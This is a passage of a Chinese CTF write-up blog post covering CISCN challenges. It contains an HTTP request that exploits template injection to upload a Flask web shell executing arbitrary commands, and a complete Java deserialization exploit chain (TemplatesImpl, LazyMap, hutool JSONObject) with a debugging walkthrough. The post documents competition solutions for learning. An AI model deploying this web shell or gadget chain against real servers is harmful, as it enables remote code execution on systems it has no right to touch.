+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">GET /admin?name=&#123;&#123;c.SaveUploadedFile(c.FormFile(c.Request.Header.Accept.0),c.Request.Header.Referer.0)&#125;&#125; HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0</span><br><span class="line">Accept: filename</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: E:\\</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrxtSm5i2S6anueQi</span><br><span class="line">Cookie: session-name=MTY4NTQxODc4MXxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXy7WOrYaP386kpRTizyXWrsODK1UE5c9AocfIk5qtTjkA==</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 591</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryrxtSm5i2S6anueQi</span><br><span class="line">Content-Disposition: form-data; name=&quot;filename&quot;; filename=&quot;server.py&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">from flask import Flask, request</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/shell&#x27;)</span><br><span class="line">def shell():</span><br><span class="line">    cmd = request.args.get(&#x27;cmd&#x27;)</span><br><span class="line">    if cmd:</span><br><span class="line">        return os.popen(cmd).read()</span><br><span class="line">    else:</span><br><span class="line">        return &#x27;shell&#x27;</span><br><span class="line"></span><br><span class="line">if __name__== &quot;__main__&quot;:</span><br><span class="line">    app.run(host=&quot;127.0.0.1&quot;,port=5000,debug=True)</span><br><span class="line">------WebKitFormBoundaryrxtSm5i2S6anueQi</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">提交</span><br><span class="line">------WebKitFormBoundaryrxtSm5i2S6anueQi--</span><br></pre></td></tr></table></figure>
+<p>这里由于是windows覆盖的好像有点问题。大致就是这样害。。</p>
+<h1 id="DeserBug-复现"><a href="#DeserBug-复现" class="headerlink" title="DeserBug(复现)"></a>DeserBug(复现)</h1><p>比较简单的java题只不过我没做出来，红温高烧加持下让我思考不了。。。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.hutool.json.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserExp</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CTFLearning\\JackSonPOJO\\target\\classes\\org\\example\\b.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;fuck&quot;</span>);</span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">Myexcpt</span> <span class="variable">myexcpt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Myexcpt</span>();</span><br><span class="line">        myexcpt.setTargetclass(com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.class);</span><br><span class="line">        myexcpt.setTypeparam(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;);</span><br><span class="line">        myexcpt.setTypearg(<span class="keyword">new</span> <span class="title class_">Templates</span>[]&#123;templatesimpl&#125;);</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(jsonObject,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        jsonObject.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazymap,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(myexcpt));</span><br><span class="line">        System.out.println(serial(hashMap));</span><br><span class="line">        <span class="comment">//deserial(serial(hashMap));</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserial</span><span class="params">(String data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(base64decodedBytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">cserialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">cunserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>遇到了点小问题，不过问题不大。。。POC综上所述。我就调试一下，断点给在JSONOBJECT的put方法里<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685422407189-2b90c42b-5f7f-4875-a6e4-32322a03f3ef.png#averageHue=%232b2d29&clientId=u59d92171-b65c-4&from=paste&height=589&id=uc6eb004e&originHeight=736&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1822037&status=done&style=none&taskId=u2ab6f4eb-c06a-4a6f-9ba5-6063e10ec28&title=&width=1536" alt="image.png"><br>首先是因为cc6中lazymap会触发put的原因，这里的jsonobject是map的子类，因此可以放入lazymap中进行decorate，进而触发到put，这里的value我们用constanttransformer把题目的bean套起来了，继续跟进<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685422473955-34d76188-2fb9-4219-a51f-220c6756f0a0.png#averageHue=%232e2f2b&clientId=u59d92171-b65c-4&from=paste&height=134&id=udb27592e&originHeight=167&originWidth=1081&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=255436&status=done&style=none&taskId=u5d7ab999-b44b-4812-85c6-78755989ad8&title=&width=864.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685422479124-f872dc12-d1f0-4c39-b294-10ccbd40596d.png#averageHue=%23292a26&clientId=u59d92171-b65c-4&from=paste&height=136&id=u418a6284&originHeight=170&originWidth=1267&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=312745&status=done&style=none&taskId=ue54e46a6-615b-4acd-a6e9-ef0ab87aad7&title=&width=1013.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685422512154-13ff886d-1c16-4075-8881-47ca3bf0822b.png#averageHue=%23272925&clientId=u59d92171-b65c-4&from=paste&height=173&id=u6880f051&originHeight=216&originWidth=1233&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=366833&status=done&style=none&taskId=ude31661c-7aa7-4857-bf79-1493e5ef2f4&title=&width=986.4" alt="image.png"><br>经过三次的put最终进入父类的put方法，value就是题目所给的bean<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685422553280-e3e68f41-8c02-4277-8e2a-2cb195a130c4.png#averageHue=%232e2e2a&clientId=u59d92171-b65c-4&from=paste&height=197&id=ub8ad94a1&originHeight=246&originWidth=985&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=353090&status=done&style=none&taskId=ud6e096ab-f11e-493a-88d8-8b3717e037a&title=&width=788" alt="image.png"><br>他会先进行校验，看看是否合规，然后进行warp<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685422596196-c291f3ac-39be-4763-ae5f-9836f2867a78.png#averageHue=%23292a25&clientId=u59d92171-b65c-4&from=paste&height=166&id=ucd38d1f8&originHeight=208&originWidth=1063&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=307180&status=done&style=none&taskId=ud0df5cb5-3681-4520-b3aa-880aff979de&title=&width=850.4" alt="image.png"><br>在这wrap函数里会进行一次isJDKCLASS判断<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685425518374-e461c26e-d10b-46e0-be99-6cb8c6f94903.png#averageHue=%23292b29&clientId=u59d92171-b65c-4&from=paste&height=690&id=uf11e7560&originHeight=863&originWidth=1596&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1924719&status=done&style=none&taskId=ueba7b627-2a93-49f2-9ad8-a4d95c84e93&title=&width=1276.8" alt="image.png"><br>如果我们放进去的obj是原生类那么就直接触发它的toString，如果不是原生类就实例化JsonObject（这也就是我当时卡在的地方，当时提前弹计算机就是我poc里提前new JSONOBJECT了)，这里显然不是原生类，所以实例化<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685425629466-5f5d31ff-ef28-4f13-9a5f-56b0fdd885fa.png#averageHue=%232f302c&clientId=u59d92171-b65c-4&from=paste&height=153&id=u9eaa6770&originHeight=191&originWidth=1123&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=310891&status=done&style=none&taskId=u01bac4b0-76a5-48c6-8708-efc917b5e9f&title=&width=898.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685425639339-5190bf90-a739-4c3f-971c-fa7600512f66.png#averageHue=%2331332f&clientId=u59d92171-b65c-4&from=paste&height=127&id=u091a1094&originHeight=159&originWidth=1156&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=275402&status=done&style=none&taskId=ua5af8d75-5780-4068-9277-6ff16cabc15&title=&width=924.8" alt="image.png"><br>调用ObjectMapper的of方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685425654519-cfdb21d8-e1b6-4977-85c0-d4d21674aeb1.png#averageHue=%232f2f2b&clientId=u59d92171-b65c-4&from=paste&height=118&id=ud3ff4697&originHeight=148&originWidth=1016&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=217280&status=done&style=none&taskId=ud911f391-0edc-4f8a-9000-4bbc0786125&title=&width=812.8" alt="image.png"><br>这个source就是之前的obj，我们自定义的<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685425698688-952fe7f3-e327-4c73-a05d-6916e511249f.png#averageHue=%232a2c2a&clientId=u59d92171-b65c-4&from=paste&height=763&id=uec010249&originHeight=954&originWidth=1823&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2441604&status=done&style=none&taskId=u576e8744-72d3-422b-8ee2-a4679ed7e6b&title=&width=1458.4" alt="image.png"><br>然后进入map方法，getter是在这里获取的<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685425726301-6801890e-16ae-4613-acab-18d821433223.png#averageHue=%23272824&clientId=u59d92171-b65c-4&from=paste&height=262&id=u693f28e7&originHeight=327&originWidth=1524&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=700764&status=done&style=none&taskId=u57008a68-a33a-4c4b-a728-fc6fb1a4982&title=&width=1219.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685425730965-8e730166-3f39-4b17-a3b4-54bc34c9a99d.png#averageHue=%23282925&clientId=u59d92171-b65c-4&from=paste&height=164&id=uac5119cf&originHeight=205&originWidth=1500&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=422287&status=done&style=none&taskId=u1ff0092f-1649-40fb-ac35-7dccaf79f2a&title=&width=1200" alt="image.png"><br>到这里obj又换了个名字叫做bean，可以看得出来准备要获取getter了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685425765669-40dfd8ba-b0ed-4745-9a5e-bf4df874e954.png#averageHue=%232d2e2a&clientId=u59d92171-b65c-4&from=paste&height=130&id=uc580b1e8&originHeight=162&originWidth=1436&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=334714&status=done&style=none&taskId=ueb763cff-47c0-4256-a833-44d841ca8bf&title=&width=1148.8" alt="image.png"><br>进入create方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685425775032-416540a4-65af-4fa3-ba1f-002432823ff1.png#averageHue=%232a2b27&clientId=u59d92171-b65c-4&from=paste&height=137&id=u383800e7&originHeight=171&originWidth=1484&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=362433&status=done&style=none&taskId=ua217a018-6bd9-4f9a-9670-c9f09ff5034&title=&width=1187.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685425788029-0c801608-647a-480e-b216-77e855333307.png#averageHue=%232e302c&clientId=u59d92171-b65c-4&from=paste&height=120&id=u345bf19e&originHeight=150&originWidth=1540&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=327281&status=done&style=none&taskId=u13e3a029-5a1b-4d68-8c4c-25bbe8e8467&title=&width=1232" alt="image.png"><br>然后进入<code>BeanCopier</code>方法里里面又调用了<code>BeanToMapCopier</code>方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685425823667-2bbf92db-1b1b-4540-96ce-02ca58ecc842.png#averageHue=%23292b28&clientId=u59d92171-b65c-4&from=paste&height=646&id=u8cde00a8&originHeight=808&originWidth=1550&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1745532&status=done&style=none&taskId=u3dee3ace-d44c-4441-b36b-f1b02aec171&title=&width=1240" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685425840416-78cbe62d-4dfd-4448-8a05-6b0fc1ae9dc2.png#averageHue=%23292a26&clientId=u59d92171-b65c-4&from=paste&height=193&id=u809b2bd4&originHeight=241&originWidth=1499&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=515938&status=done&style=none&taskId=u3651e1c2-fd01-4326-aa45-2c1383bfeb8&title=&width=1199.2" alt="image.png"><br>然后看到这里，恭喜你只是看完了实例化，我调这的时候也被骗了，之后回到create方法外面，beantoMap方法最后面还有个copy方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685425955279-847c33c8-fa11-4899-b968-e11827b0afea.png#averageHue=%232d2e2a&clientId=u59d92171-b65c-4&from=paste&height=140&id=u9367ff66&originHeight=175&originWidth=1495&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=379471&status=done&style=none&taskId=u7b38b23f-da01-4146-b243-8837ab704bb&title=&width=1196" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685425960966-c3e7b6b9-a001-4149-b2f0-0824df1407c4.png#averageHue=%23282824&clientId=u59d92171-b65c-4&from=paste&height=150&id=uf4da3b56&originHeight=187&originWidth=856&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=217685&status=done&style=none&taskId=u2e0bead2-68be-4a49-915a-060ba5b053c&title=&width=684.8" alt="image.png"><br>然后进入foreach方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685426026986-aa07f9ef-257d-4304-ba65-c333f1262fd0.png#averageHue=%232a2c29&clientId=u59d92171-b65c-4&from=paste&height=738&id=u443e2fb8&originHeight=923&originWidth=1716&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2256050&status=done&style=none&taskId=ub28271f9-8f00-4a0d-b88c-8a07f0a930b&title=&width=1372.8" alt="image.png"><br>这里有一个很重要的点就是<code>sourcePropDescMap</code>的获取，这个对象包含着我们bean的所有信息，包括getter和filed，我们看看他是怎么获取的。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685430369940-2f8f015f-1508-4098-bd09-dd23d7581795.png#averageHue=%232f2f2a&clientId=u5f8d80a7-5aa0-4&from=paste&height=240&id=u11085d44&originHeight=300&originWidth=1046&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=470234&status=done&style=none&taskId=udb6db875-8a21-43ea-8888-53e99abd849&title=&width=836.8" alt="image.png"><br>首先进入getBeanDesc获取初步信息<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685430391496-59ea98c8-3339-40fb-a44f-6f668644cdf5.png#averageHue=%232b2c28&clientId=u5f8d80a7-5aa0-4&from=paste&height=189&id=ua1167baa&originHeight=236&originWidth=1426&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=475851&status=done&style=none&taskId=u9dabb2cf-7491-4e18-9cb6-d96897838a1&title=&width=1140.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685430396317-89a3d92d-f817-4ae3-a064-8a569d8bc710.png#averageHue=%232d2e2a&clientId=u5f8d80a7-5aa0-4&from=paste&height=171&id=u5f0a8fbb&originHeight=214&originWidth=1258&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=384253&status=done&style=none&taskId=u99432c6a-27d7-453e-a628-a726a4bf516&title=&width=1006.4" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685430409098-d24e5a5a-5f8e-4c74-8dd0-f02651ba1e11.png#averageHue=%232d2e2a&clientId=u5f8d80a7-5aa0-4&from=paste&height=158&id=u2d2a8fcf&originHeight=197&originWidth=1297&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=357172&status=done&style=none&taskId=u2c29e153-8ecc-4c2d-97ae-88f14630a57&title=&width=1037.6" alt="image.png"><br>最后会到BeanDesc的初始化方法里进行init<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685430428894-79719443-853e-4bfd-807c-cf35d2079089.png#averageHue=%232a2c28&clientId=u5f8d80a7-5aa0-4&from=paste&height=377&id=ub49cfa75&originHeight=471&originWidth=1587&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1018896&status=done&style=none&taskId=u94e36429-19e6-40a8-975f-9087f4cac17&title=&width=1269.6" alt="image.png"><br>在这一部用Reflectionutil获取getter。这就完结了，将获取到的getter去创建一个prop<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685430460025-85fda599-30a6-4796-b03a-3e5fa0921eb2.png#averageHue=%23414443&clientId=u5f8d80a7-5aa0-4&from=paste&height=54&id=u5275f535&originHeight=68&originWidth=1012&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=112608&status=done&style=none&taskId=ue15bd798-7620-4175-884b-1d53e457c32&title=&width=809.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685430476823-9daffc83-be17-4dcd-90cf-2d14f0716625.png#averageHue=%232b2b28&clientId=u5f8d80a7-5aa0-4&from=paste&height=350&id=u84c78609&originHeight=437&originWidth=1180&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=731700&status=done&style=none&taskId=u44dd587d-ef2d-40f5-bbbd-f5c95e7355b&title=&width=944" alt="image.png"><br>获取到后退回copy方法，调用getValue的时候触发getter，不要忘了上面的细节，这个只接受非原生类<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685430521989-bf859422-ff9e-41f7-9508-e724d888f061.png#averageHue=%232a2b27&clientId=u5f8d80a7-5aa0-4&from=paste&height=282&id=ue15501b6&originHeight=353&originWidth=1544&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=794540&status=done&style=none&taskId=ud1cda533-27f2-4372-b3da-a3d5fc3d3e8&title=&width=1235.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685430550840-7912fe43-241e-46b0-9b71-290bf1e0fbf4.png#averageHue=%2331312e&clientId=u5f8d80a7-5aa0-4&from=paste&height=155&id=ud4f0ba02&originHeight=194&originWidth=1053&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=306755&status=done&style=none&taskId=uaf45f6a6-24fc-4ac0-8573-699a0ed9ebd&title=&width=842.4" alt="image.png"><br>弹出计算机，结束。</p>
+<h1 id="Reading"><a href="#Reading" class="headerlink" title="Reading"></a>Reading</h1><p>烂题不想复现</p>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/CTF/" class="tag">#CTF</a><a href="/tags/CISCN/" class="tag">#CISCN</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2023/06/16/PHP8%20OPCACHE%E7%BC%93%E5%AD%98%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4RCE/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">PHP8 OPCACHE缓存文件导致RCE</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2023/05/29/%5B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%5DFRIDA%20HOOK%EF%BC%9A%E8%84%B1%E5%A3%B3%E3%80%81%E6%89%8B%E6%9C%BA%E6%8A%93%E5%8C%85%E7%BB%95%E8%BF%87SSL/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">[渗透测试]FRIDA HOOK：脱壳、手机抓包</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
